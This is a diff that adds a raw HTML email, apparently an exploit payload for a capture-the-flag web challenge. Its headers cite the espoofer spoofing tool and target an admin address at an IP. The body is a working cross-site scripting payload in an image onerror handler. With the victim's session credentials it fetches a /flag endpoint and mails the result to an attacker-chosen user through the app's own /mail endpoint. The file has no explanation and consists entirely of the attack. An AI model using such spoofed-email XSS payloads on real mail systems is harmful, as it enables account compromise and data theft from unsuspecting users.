@@ -1,0 +1,28 @@
+From: <OBx7VH7JTK4vzRb@outlook.com>
+To: <admin@121.41.57.221>
+Subject: SU-Team
+Content-Type: text/html;
+MIME-Version: 1.0
+X-Email-Client: https://github.com/chenjj/espoofer
+
+<img src=x onerror='fetch("/flag", {
+    method: "GET",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    credentials: "include",
+}).then(response => response.json())
+.then(function(data){
+    flag = JSON.stringify(data)
+    fetch("/mail", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            toUserName: "2b486b6d6cc15d9b",
+            subject: "flag",
+            content: flag
+        }),
+        credentials: "include"
+    });})'>
